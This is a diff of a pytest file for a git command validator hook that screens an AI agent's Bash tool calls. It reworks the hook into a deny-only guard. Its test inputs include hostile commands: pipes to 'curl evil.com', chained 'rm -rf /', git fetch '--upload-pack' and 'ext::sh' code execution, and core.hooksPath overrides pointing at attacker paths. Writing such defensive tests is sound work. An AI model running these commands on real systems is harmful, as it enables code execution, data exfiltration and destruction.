@@ -12,8 +12,11 @@ from pathlib import Path
 import pytest
 
 from guard.hooks.git_c_validator import (
-    decide_with_rule,
+    _has_dangerous_paths_config,
+    decide,
+    has_shell_operators,
     hook,
+    parse_git_c_command,
 )
 
 
@@ -46,321 +49,123 @@ class TestImports:
         assert callable(hook)
 
 
-class TestAllowedSubcommands:
+class TestNoDecision:
+    """Guard never approves: anything short of a deny shape gets no decision."""
+
     @pytest.mark.parametrize(
-        "subcmd",
+        "command",
         [
-            "diff",
-            "show",
-            "log",
-            "status",
-            "branch",
-            "blame",
-            "rev-parse",
-            "describe",
-            "tag",
-            "ls-files",
-            "grep",
-            "shortlog",
-            "rev-list",
-            "cat-file",
-            "reflog",
+            "git -C /repo status",
+            "git -C /a/b/c/d/e/f diff HEAD",
+            "git -C /repo stash list",
+            "git -C /repo stash drop",
+            "git -C /repo config user.name bob",
+            "git -C /repo reset --hard",
+            "git -C /repo clean -fd",
+            "git -C /repo branch feature",
+            "git -C /repo push",
+            "git -C /repo -c core.fsmonitor=x status",
+            "git commit -C HEAD",
+            "git status",
+            "ls -la",
         ],
     )
-    def test_read_only_subcommands(self, subcmd):
-        decision, _ = _run(f"git -C /Users/dev/develop/repo {subcmd}")
-        assert decision == "allow"
-
-    def test_deep_path(self):
-        decision, _ = _run("git -C /a/b/c/d/e/f diff HEAD")
-        assert decision == "allow"
-
-    def test_stash_list(self):
-        decision, _ = _run("git -C /path stash list")
-        assert decision == "allow"
-
-    def test_config_get(self):
-        decision, _ = _run("git -C /path config --get user.email")
-        assert decision == "allow"
-
-    def test_diff_with_branch_range(self):
-        decision, _ = _run("git -C /path diff origin/main..feat -- file.py")
-        assert decision == "allow"
-
-
-class TestDeniedSubcommands:
-    def test_git_c_validator_denies_unsafe_input(self):
-        decision, code = _run("git -C /path reset --hard HEAD")
-        assert decision == "deny"
-        assert code == 2
-
-    def test_clean(self):
-        decision, code = _run("git -C /path clean -fd")
-        assert decision == "deny"
-        assert code == 2
-
-    def test_stash_drop(self):
-        decision, code = _run("git -C /path stash drop")
-        assert decision == "deny"
-        assert code == 2
-
-    def test_stash_pop(self):
-        decision, code = _run("git -C /path stash pop")
-        assert decision == "deny"
-        assert code == 2
-
-    def test_stash_clear(self):
-        decision, code = _run("git -C /path stash clear")
-        assert decision == "deny"
-        assert code == 2
-
-
-class TestAskSubcommands:
-    @pytest.mark.parametrize(
-        "subcmd",
-        [
-            "push",
-            "pull",
-            "commit",
-            "checkout",
-            "add",
-            "merge",
-            "rebase",
-            "cherry-pick",
-            "revert",
-        ],
-    )
-    def test_write_subcommands_deny(self, subcmd):
-        decision, _ = _run(f"git -C /path {subcmd}")
-        assert decision == "deny"
-
-    def test_config_write(self):
-        decision, _ = _run("git -C /path config user.email foo@bar.com")
-        assert decision == "deny"
+    def test_passes_through(self, command):
+        assert decide(command) is None
+        decision, code = _run(command)
+        assert (decision, code) == ("passthrough", 0)
 
 
 class TestFetch:
-    """``git -C <repo> fetch`` only updates remote-tracking refs, so it is safe."""
-
     @pytest.mark.parametrize(
         "command",
         [
             "git -C /repo fetch",
-            "git -C /repo fetch origin",
-            "git -C /repo fetch origin main",
             "git -C /repo fetch --all --tags",
             "git -C /repo fetch --depth 1 git@github.com:o/r.git",
-            "git -C /repo fetch https://github.com/o/r.git main",
-            "git -C /repo fetch --dry-run -v origin",
-        ],
-    )
-    def test_plain_fetch_allows(self, command):
-        envelope, rule = decide_with_rule(command)
-        assert _envelope_decision(envelope) == "allow"
-        assert rule == "guard.git_c_validator"
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git -C /repo fetch --prune",
-            "git -C /repo fetch -p origin",
-            "git -C /repo fetch --prune-tags origin",
-            "git -C /repo fetch --force origin",
-            "git -C /repo fetch -u origin main:main",
+            "git -C /repo fetch --prune origin",
             "git -C /repo fetch origin main:main",
-            "git -C /repo fetch origin +refs/heads/*:refs/remotes/origin/*",
-            "git -C /repo fetch --set-upstream origin main",
-            "git -C /repo fetch --refmap= origin",
         ],
     )
-    def test_ref_writing_fetch_steers(self, command):
-        envelope, rule = decide_with_rule(command)
-        assert _envelope_decision(envelope) == "deny"
-        assert rule == "guard.git_c_validator:not_read_only"
-        reason = envelope["hookSpecificOutput"]["permissionDecisionReason"]
-        assert "cd /repo && git fetch" in reason
+    def test_fetch_without_exec_passes(self, command):
+        assert decide(command) is None
 
     @pytest.mark.parametrize(
         "command",
         [
             "git -C /repo fetch --upload-pack=touch /tmp/x origin",
             "git -C /repo fetch --upload-pack 'sh -c id' origin",
+            "git -C /repo fetch --exec=x origin",
             "git -C /repo fetch 'ext::sh -c touch% /tmp/pwned'",
         ],
     )
-    def test_exec_fetch_is_floor(self, command):
-        envelope, rule = decide_with_rule(command)
+    def test_exec_fetch_denies(self, command):
+        envelope = decide(command)
         assert _envelope_decision(envelope) == "deny"
-        assert rule == "guard.git_c_validator:read_exec"
+        assert "runs a program" in envelope["hookSpecificOutput"]["permissionDecisionReason"]
+
+    def test_value_flag_argument_is_not_a_remote(self):
+        # ``--depth`` takes a value, so the next token is that value, not a
+        # remote or refspec, and the scan goes on past it.
+        assert decide("git -C /repo fetch --depth ext::x origin") is None
 
 
-class TestRuleKeys:
-    """Each deny shape carries the tier key the auto-mode split reads."""
-
+class TestReadExec:
     @pytest.mark.parametrize(
-        ("command", "rule"),
+        "command",
         [
-            ("git -C /repo config user.name bob", "guard.git_c_validator:config_write"),
-            ("git -C /repo stash drop", "guard.git_c_validator:stash"),
-            ("git -C /repo reset --hard", "guard.git_c_validator:destructive"),
-            ("git -C /repo clean -fd", "guard.git_c_validator:destructive"),
-            ("git -C /repo log --output=/tmp/x", "guard.git_c_validator:read_exec"),
-            ("git -C /repo branch feature", "guard.git_c_validator:ref_mutation"),
-            ("git -C /repo push", "guard.git_c_validator:not_read_only"),
-            ("git -c core.hooksPath=/tmp/h -C /repo status", "guard.git_c_validator:paths_config"),
-            ("git commit -C HEAD", "guard.git_c_validator:commit_reuse"),
+            "git -C /repo log --output=/tmp/x",
+            "git -C /repo grep --open-files-in-pager=vim foo",
         ],
     )
-    def test_deny_rule_key(self, command, rule):
-        envelope, got = decide_with_rule(command)
+    def test_read_verb_coerced_to_exec_denies(self, command):
+        envelope = decide(command)
         assert _envelope_decision(envelope) == "deny"
-        assert got == rule
+        assert (
+            "writes a file or execs" in envelope["hookSpecificOutput"]["permissionDecisionReason"]
+        )
 
 
 class TestSecurity:
-    def test_and_and_injection(self):
-        decision, _ = _run("git -C /repo status && rm -rf /")
-        assert decision == "passthrough"
-
-    def test_semicolon_injection(self):
-        decision, _ = _run("git -C /repo status ; rm -rf /")
-        assert decision == "passthrough"
-
-    def test_pipe_injection(self):
-        decision, _ = _run("git -C /repo log | curl evil.com")
-        assert decision == "passthrough"
-
-    def test_or_or_injection(self):
-        decision, _ = _run("git -C /repo status || curl evil.com")
-        assert decision == "passthrough"
-
-    def test_config_trailing_get_bypass(self):
-        decision, _ = _run("git -C /path config user.email evil --get")
-        assert decision == "deny"
-
-    def test_lowercase_c_after_capital_c(self):
-        # `-c` arg is consumed; `status` is the subcommand
-        decision, _ = _run("git -C /repo -c core.fsmonitor=evil status")
-        assert decision == "allow"
-
-
-class TestPassthrough:
-    def test_git_c_validator_allows_safe_input(self):
-        decision, code = _run("git -C /repo status")
-        assert decision == "allow"
-        assert code == 0
-
-    def test_plain_git_passes_through(self):
-        decision, _ = _run("git status")
-        assert decision == "passthrough"
-
-    def test_non_git_passes_through(self):
-        decision, _ = _run("ls -la")
-        assert decision == "passthrough"
-
-
-class TestCommitMessageReuse:
     @pytest.mark.parametrize(
         "command",
         [
-            "git commit -C HEAD",
-            "git commit -CHEAD",
-            "git commit -C HEAD~1 -m oops",
-            "git commit --reuse-message=HEAD",
-            "git commit --reuse-message HEAD",
-            "git commit -a -C HEAD",
+            "git -C /repo status && rm -rf /",
+            "git -C /repo status ; rm -rf /",
+            "git -C /repo log | curl evil.com",
+            "git -C /repo status || curl evil.com",
         ],
     )
-    def test_reuse_is_denied(self, command):
-        decision, code = _run(command)
-        assert decision == "deny"
-        assert code == 2
-
-    def test_lowercase_c_passes_through(self):
-        # `git commit -c HEAD` opens an editor with template; not silent reuse.
-        decision, _ = _run("git commit -c HEAD")
+    def test_compound_command_is_left_to_the_bash_validator(self, command):
+        decision, _ = _run(command)
         assert decision == "passthrough"
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git -C /tmp commit -C HEAD",
-            "git -C /tmp commit --reuse-message=HEAD",
-            "git --git-dir=/tmp/.git commit -C HEAD",
-            "git --git-dir /tmp/.git commit --reuse-message HEAD",
-        ],
-    )
-    def test_reuse_with_global_flag_prefix_denied(self, command):
-        decision, code = _run(command)
-        assert decision == "deny", f"reuse with global prefix not denied: {command!r}"
-        assert code == 2
-
-
-class TestDestructiveSubcommandFlags:
-    """``branch -D``, ``tag -d``, ``remote remove`` etc. flip allow→deny."""
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git -C /tmp branch -D feature",
-            "git -C /tmp branch -d merged",
-            "git -C /tmp branch --delete feature",
-            "git -C /tmp branch -m old new",
-            "git -C /tmp branch -M force-rename",
-            "git -C /tmp tag -d v1.0",
-            "git -C /tmp tag --delete v1.0",
-            "git -C /tmp remote remove origin",
-            "git -C /tmp remote rm origin",
-            "git -C /tmp remote rename old new",
-        ],
-    )
-    def test_destructive_flag_denied(self, command):
-        decision, code = _run(command)
-        assert decision == "deny", f"destructive flag missed: {command!r}"
-        assert code == 2
-
-    def test_branch_listing_still_allowed(self):
-        decision, _ = _run("git -C /tmp branch -a")
-        assert decision == "allow"
-
-    def test_tag_listing_still_allowed(self):
-        decision, _ = _run("git -C /tmp tag -l")
-        assert decision == "allow"
-
-    def test_remote_listing_still_allowed(self):
-        decision, _ = _run("git -C /tmp remote -v")
-        assert decision == "allow"
 
 
 class TestDangerousPathsConfigKeys:
     """``-c core.hooksPath=...`` / ``-c core.attributesFile=...`` are denied.
 
-    Any command-line override of these keys is malicious — the next git
-    subcommand would load hooks/attributes from the override target.
-    Both relative-path traversal (``../foo``) AND absolute paths
-    (``/tmp/evil``) are equally dangerous, so the rule denies any value.
-    Permanent settings go through ``git config``; repo-local hooks live in
-    ``.git/hooks/``.
+    The next git subcommand would load hooks or attributes from the override
+    target, so any value denies. Permanent settings go through ``git config``;
+    repo-local hooks live in ``.git/hooks/``.
     """
 
     @pytest.mark.parametrize(
         "command",
         [
-            # Traversal shapes
             "git -c core.hooksPath=../foo status",
             "git -c core.hooksPath=../../etc/x status",
             "git -c core.attributesFile=../../etc/x diff",
             "git -c core.AttributesFile=../bar log",  # case-insensitive key
             "git -C /repo -c core.hooksPath=../escape status",
             "git -c core.hooksPath=foo/../../escape status",
-            # Absolute-path shapes (the gap closed by this branch)
             "git -c core.hooksPath=/tmp/evil status",
             "git -c core.hooksPath=/var/folders/x/evil status",
             "git -c core.attributesFile=/etc/gitattributes diff",
-            # Relative path without traversal — still attacker-controlled
             "git -c core.hooksPath=hooks/local status",
-            # Empty value still overrides; deny.
             "git -c core.hooksPath= status",
+            "git --config-env core.hooksPath=DANGER status",
+            "git --config-env core.attributesFile=ENV diff",
+            "git -C /repo --config-env core.hooksPath=X status",
         ],
     )
     def test_dangerous_keys_denied(self, command):
@@ -368,77 +173,13 @@ class TestDangerousPathsConfigKeys:
         assert decision == "deny", f"override not denied: {command!r}"
         assert code == 2
 
-    def test_unrelated_key_passthrough(self):
-        # Other config keys are not exec sinks — pass through to the rest
-        # of the validator (which may allow/deny on its own).
-        decision, _ = _run("git -c color.ui=../foo status")
-        assert decision != "deny"
-
     @pytest.mark.parametrize(
         "command",
-        [
-            "git --config-env core.hooksPath=DANGER status",
-            "git --config-env core.attributesFile=ENV diff",
-            "git -C /repo --config-env core.hooksPath=X status",
-        ],
+        ["git -c color.ui=../foo status", "git --config-env color.ui=ENV status"],
     )
-    def test_config_env_two_token_denied(self, command):
-        decision, code = _run(command)
-        assert decision == "deny", f"two-token --config-env not denied: {command!r}"
-        assert code == 2
-
-    def test_config_env_two_token_unrelated_passthrough(self):
-        decision, _ = _run("git --config-env color.ui=ENV status")
-        assert decision != "deny"
-
-
-class TestStashUnknownAction:
-    """``git -C <path> stash <unknown>`` exercises the ``_decide_stash``
-    fallthrough path.
-
-    DENIED_STASH_ACTIONS denies ``pop|drop|clear``; ``list|show`` are
-    allowed read-only. Anything else (``apply``, ``push``, ``save``,
-    ``branch``) returns None from ``_decide_stash`` and the outer
-    classifier resolves via the generic subcommand allowlist
-    (``stash`` is in ``ALLOWED_SUBCOMMANDS``) → ``allow``. The point of
-    this test is the fallthrough wiring, not the resulting decision —
-    a regression that made ``_decide_stash`` raise or always-deny would
-    show up here.
-    """
-
-    @pytest.mark.parametrize("action", ["apply", "push", "save", "branch"])
-    def test_unknown_stash_action_resolves(self, action):
-        decision, _ = _run(f"git -C /tmp/repo stash {action}")
-        assert decision == "allow", f"stash {action} fallthrough broken: got {decision}"
-
-    def test_destructive_stash_actions_denied(self):
-        for action in ("pop", "drop", "clear"):
-            decision, code = _run(f"git -C /tmp/repo stash {action}")
-            assert decision == "deny", f"stash {action} should deny"
-            assert code == 2
-
-    def test_readonly_stash_actions_allowed(self):
-        for action in ("list", "show"):
-            decision, _ = _run(f"git -C /tmp/repo stash {action}")
-            assert decision == "allow", f"stash {action} should allow"
-
-
-# ---------------------------------------------------------------------------
-# In-process tests: exercise the module API directly so coverage is collected.
-# The subprocess-based tests above protect the wire shape but don't contribute
-# to line coverage of the source module (separate Python process).
-# ---------------------------------------------------------------------------
-
-from guard.hooks.git_c_validator import (
-    _classify_subcommand,
-    _decide_config,
-    _decide_stash,
-    _has_dangerous_paths_config,
-    _is_commit_reuse,
-    decide,
-    has_shell_operators,
-    parse_git_c_command,
-)
+    def test_unrelated_key_passes(self, command):
+        decision, _ = _run(command)
+        assert decision == "passthrough"
 
 
 class TestHasShellOperators:
@@ -482,7 +223,6 @@ class TestParseGitC:
         assert rest == ["--oneline"]
 
     def test_consumes_other_flag_args(self):
-        # -c key=value should be skipped (flag-with-arg form)
         path, sub, _ = parse_git_c_command("git -C /repo -c color.ui=false status")
         assert path == "/repo"
         assert sub == "status"
@@ -501,112 +241,6 @@ class TestParseGitC:
         assert path == "/repo"
         assert sub is None
         assert rest == []
-
-
-class TestClassifySubcommandDirect:
-    @pytest.mark.parametrize(
-        "sub",
-        [
-            "status",
-            "log",
-            "diff",
-            "show",
-            "blame",
-            "rev-parse",
-            "describe",
-            "ls-files",
-            "ls-tree",
-            "grep",
-            "shortlog",
-            "cat-file",
-            "rev-list",
-            "name-rev",
-            "for-each-ref",
-            "reflog",
-            "count-objects",
-            "fsck",
-            "verify-pack",
-        ],
-    )
-    def test_read_only(self, sub):
-        env = _classify_subcommand(sub, [])
-        assert _envelope_decision(env) == "allow"
-
-    @pytest.mark.parametrize("sub", ["reset", "clean"])
-    def test_destructive(self, sub):
-        env = _classify_subcommand(sub, [])
-        assert _envelope_decision(env) == "deny"
-
-    @pytest.mark.parametrize(
-        "sub",
-        ["push", "pull", "commit", "checkout", "switch", "merge", "rebase", "cherry-pick"],
-    )
-    def test_unknown_denies(self, sub):
-        env = _classify_subcommand(sub, [])
-        assert _envelope_decision(env) == "deny"
-
-    def test_destructive_flag_branch_dash_D(self):
-        env = _classify_subcommand("branch", ["-D", "feature"])
-        assert _envelope_decision(env) == "deny"
-
-    def test_destructive_flag_tag_dash_d(self):
-        env = _classify_subcommand("tag", ["-d", "v1"])
-        assert _envelope_decision(env) == "deny"
-
-    def test_destructive_flag_remote_remove(self):
-        env = _classify_subcommand("remote", ["remove", "origin"])
-        assert _envelope_decision(env) == "deny"
-
-    def test_branch_listing_allowed(self):
-        env = _classify_subcommand("branch", ["-a"])
-        assert _envelope_decision(env) == "allow"
-
-
-class TestDecideConfigDirect:
-    @pytest.mark.parametrize(
-        "flag",
-        ["--get", "--list", "-l", "--get-all", "--get-regexp"],
-    )
-    def test_read_flags_allow(self, flag):
-        env = _decide_config([flag, "user.email"])
-        assert _envelope_decision(env) == "allow"
-
-    def test_write_denies(self):
-        env = _decide_config(["user.email", "foo@bar.com"])
-        assert _envelope_decision(env) == "deny"
-
-    def test_add_denies(self):
-        env = _decide_config(["--add", "remote.origin.fetch", "+refs/heads/*"])
-        assert _envelope_decision(env) == "deny"
-
-    def test_unset_denies(self):
-        env = _decide_config(["--unset", "user.email"])
-        assert _envelope_decision(env) == "deny"
-
-    def test_empty_denies(self):
-        # `git -C x config` with no remaining args -> write-ish branch (deny).
-        env = _decide_config([])
-        assert _envelope_decision(env) == "deny"
-
-
-class TestDecideStashDirect:
-    @pytest.mark.parametrize("action", ["pop", "drop", "clear"])
-    def test_destructive(self, action):
-        env = _decide_stash([action])
-        assert _envelope_decision(env) == "deny"
-
-    @pytest.mark.parametrize("action", ["list", "show"])
-    def test_readonly(self, action):
-        env = _decide_stash([action])
-        assert _envelope_decision(env) == "allow"
-
-    def test_empty_remaining_falls_through(self):
-        # `git stash` with no action -> None (caller resolves via allowlist)
-        assert _decide_stash([]) is None
-
-    @pytest.mark.parametrize("action", ["apply", "push", "save", "branch"])
-    def test_unknown_falls_through(self, action):
-        assert _decide_stash([action]) is None
 
 
 class TestDangerousPathsConfigDirect:
@@ -643,35 +277,7 @@ class TestDangerousPathsConfigDirect:
         assert _has_dangerous_paths_config('git -c "x') is None
 
     def test_config_env_malformed_payload(self):
-        # No '=' in payload -> not a key=value, skipped.
         assert _has_dangerous_paths_config("git --config-env=corehookspath status") is None
-
-
-class TestIsCommitReuseDirect:
-    @pytest.mark.parametrize(
-        "cmd",
-        [
-            "git commit -C HEAD",
-            "git commit -CHEAD",
-            "git commit --reuse-message=HEAD",
-            "git commit --reuse-message HEAD",
-            "git -C /tmp commit -C HEAD",
-        ],
-    )
-    def test_reuse(self, cmd):
-        assert _is_commit_reuse(cmd) is True
-
-    @pytest.mark.parametrize(
-        "cmd",
-        [
-            "git commit -m hi",
-            "git status",
-            'git commit "unterm',
-            "git -C /tmp status",
-        ],
-    )
-    def test_not_reuse(self, cmd):
-        assert _is_commit_reuse(cmd) is False
 
 
 class TestDecideDirect:
@@ -682,103 +288,44 @@ class TestDecideDirect:
         env = decide("git -C /repo -ccore.hooksPath=/tmp/evil status")
         assert _envelope_decision(env) == "deny"
         reason = env["hookSpecificOutput"]["permissionDecisionReason"]
-        assert "core.hooksPath" in reason or "core.hookspath" in reason.lower()
+        assert "core.hookspath" in reason.lower()
 
-    def test_commit_reuse_denied(self):
-        env = decide("git commit -C HEAD")
-        assert _envelope_decision(env) == "deny"
-
-    def test_no_path_no_subcommand_falls_through(self):
-        # `git -C /repo` alone -> path set, sub None -> None
+    def test_no_subcommand_falls_through(self):
         assert decide("git -C /repo") is None
-
-    def test_plain_status_falls_through_without_C(self):
-        # parse_git_c_command returns path=None, sub="status" -> None per decide
-        assert decide("git status") is None
-
-    def test_allowed_subcommand(self):
-        env = decide("git -C /repo status")
-        assert _envelope_decision(env) == "allow"
-
-    def test_denied_subcommand(self):
-        env = decide("git -C /repo reset --hard")
-        assert _envelope_decision(env) == "deny"
 
 
 class TestHookEntryPointDirect:
     """Drive ``hook()`` in-process so the JSON envelope branches are covered."""
 
-    def test_non_bash_no_output(self, capsys):
-        hook({"tool_name": "Read", "tool_input": {"command": "git -C /r status"}})
-        out = capsys.readouterr().out
-        assert out == ""
-
-    def test_missing_tool_input(self, capsys):
-        hook({"tool_name": "Bash"})
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            {"tool_name": "Read", "tool_input": {"command": "git -C /r status"}},
+            {"tool_name": "Bash"},
+            {"tool_name": "Bash", "tool_input": "string"},
+            {"tool_name": "Bash", "tool_input": {"command": ""}},
+            {"tool_name": "Bash", "tool_input": {"command": 42}},
+            {"tool_name": "Bash", "tool_input": {"command": "ls -la"}},
+            {"tool_name": "Bash", "tool_input": {"command": "git status"}},
+            {"tool_name": "Bash", "tool_input": {"command": 'git "unterm'}},
+            {"tool_name": "Bash", "tool_input": {"command": "git -C /repo status && rm -rf /"}},
+            {"tool_name": "Bash", "tool_input": {"command": "git -C /repo status"}, "cwd": 123},
+        ],
+    )
+    def test_silent(self, capsys, payload):
+        hook(payload)
         assert capsys.readouterr().out == ""
 
-    def test_tool_input_not_dict(self, capsys):
-        hook({"tool_name": "Bash", "tool_input": "string"})
-        assert capsys.readouterr().out == ""
-
-    def test_empty_command(self, capsys):
-        hook({"tool_name": "Bash", "tool_input": {"command": ""}})
-        assert capsys.readouterr().out == ""
-
-    def test_command_not_string(self, capsys):
-        hook({"tool_name": "Bash", "tool_input": {"command": 42}})
-        assert capsys.readouterr().out == ""
-
-    def test_not_git_returns_silently(self, capsys):
-        hook({"tool_name": "Bash", "tool_input": {"command": "ls -la"}})
-        assert capsys.readouterr().out == ""
-
-    def test_git_without_C_or_commit_silent(self, capsys):
-        hook({"tool_name": "Bash", "tool_input": {"command": "git status"}})
-        assert capsys.readouterr().out == ""
-
-    def test_allow_envelope_emitted(self, capsys):
-        hook(
-            {
-                "tool_name": "Bash",
-                "tool_input": {"command": "git -C /repo status"},
-                "session_id": "s",
-                "cwd": "/repo",
-            }
-        )
-        out = capsys.readouterr().out.strip()
-        env = json.loads(out)
-        assert env["hookSpecificOutput"]["permissionDecision"] == "allow"
-
-    def test_deny_envelope_exits_2(self, capsys):
+    @pytest.mark.parametrize(
+        "command",
+        ["git -C /repo -ccore.hooksPath=/tmp/evil status", "git -C /repo log --output=/tmp/x"],
+    )
+    def test_deny_envelope_exits_2(self, capsys, command):
         with pytest.raises(SystemExit) as excinfo:
             hook(
                 {
                     "tool_name": "Bash",
-                    "tool_input": {"command": "git -C /repo reset --hard"},
-                    "session_id": "s",
-                    "cwd": "/repo",
-                }
-            )
-        assert excinfo.value.code == 2
-        out = capsys.readouterr().out.strip()
-        assert json.loads(out)["hookSpecificOutput"]["permissionDecision"] == "deny"
-
-    def test_shell_operator_falls_through_silent(self, capsys):
-        hook(
-            {
-                "tool_name": "Bash",
-                "tool_input": {"command": "git -C /repo status && rm -rf /"},
-            }
-        )
-        assert capsys.readouterr().out == ""
-
-    def test_fused_core_hookspath_denied(self, capsys):
-        with pytest.raises(SystemExit) as excinfo:
-            hook(
-                {
-                    "tool_name": "Bash",
-                    "tool_input": {"command": "git -C /repo -ccore.hooksPath=/tmp/evil status"},
+                    "tool_input": {"command": command},
                     "session_id": "s",
                     "cwd": "/repo",
                 }
@@ -786,23 +333,3 @@ class TestHookEntryPointDirect:
         assert excinfo.value.code == 2
         env = json.loads(capsys.readouterr().out.strip())
         assert env["hookSpecificOutput"]["permissionDecision"] == "deny"
-        reason = env["hookSpecificOutput"]["permissionDecisionReason"]
-        assert "core.hooksPath" in reason or "hookspath" in reason.lower()
-
-    def test_unterminated_quote_falls_back_to_split(self, capsys):
-        # shlex.split raises, hook falls back to str.split; first token != 'git'
-        # path triggered, but if it IS 'git' without -C/-c/commit, returns silent.
-        hook({"tool_name": "Bash", "tool_input": {"command": 'git "unterm'}})
-        assert capsys.readouterr().out == ""
-
-    def test_cwd_non_string_handled(self, capsys):
-        # cwd is not a string -> normalized to None inside the hook, no crash.
-        hook(
-            {
-                "tool_name": "Bash",
-                "tool_input": {"command": "git -C /repo status"},
-                "cwd": 123,
-            }
-        )
-        env = json.loads(capsys.readouterr().out.strip())
-        assert env["hookSpecificOutput"]["permissionDecision"] == "allow"
